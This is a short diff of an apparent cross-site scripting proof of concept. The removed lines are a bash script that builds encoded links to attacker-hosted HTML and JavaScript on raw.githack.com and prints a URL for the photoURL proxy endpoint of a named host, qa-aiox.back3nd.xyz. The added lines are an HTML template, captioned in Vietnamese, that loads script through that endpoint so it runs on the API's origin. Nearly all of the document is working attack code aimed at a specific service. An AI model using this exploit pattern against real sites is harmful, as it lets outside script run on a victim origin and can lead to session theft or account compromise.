@@ -1,8 +1,5 @@
-#!/usr/bin/env bash
-set -euo pipefail
-GH_USER="<username-github>"; REPO="xss-poc"; BRANCH="main"
-HTML="https://raw.githack.com/$GH_USER/$REPO/$BRANCH/poc.html"
-JS="https://raw.githack.com/$GH_USER/$REPO/$BRANCH/viewer.js"
-enc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }
-sed "s|__JS__|$(enc "$JS")|" poc.template.html > poc.html
-echo "LINK: https://qa-aiox.back3nd.xyz/api/user/photoURL?url=$(enc "$HTML")"
+<!doctype html>
+<meta charset="utf-8">
+<h1>POC — script chạy trên origin API</h1>
+<pre id="out">loading…</pre>
+<script src="/api/user/photoURL?url=__JS__"></script>
